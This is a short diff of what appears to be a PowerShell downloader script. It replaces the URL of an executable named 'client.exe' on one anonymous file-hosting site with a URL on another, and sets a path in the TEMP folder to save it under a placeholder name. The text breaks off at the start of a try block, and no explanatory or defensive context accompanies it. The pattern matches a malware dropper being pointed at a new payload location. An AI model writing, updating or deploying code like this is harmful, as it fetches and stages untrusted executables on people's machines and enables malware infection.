@@ -1,4 +1,4 @@
-$url = "https://store-na-phx-5.gofile.io/download/web/3144a1f8-a97a-4d4d-9c4f-0b020ceb3b86/client.exe"
+$url = "https://www.directfiles.link/E19L6N183/client.exe"
 $path = Join-Path $env:TEMP "xxxxxxxx.exe"
 
 try {
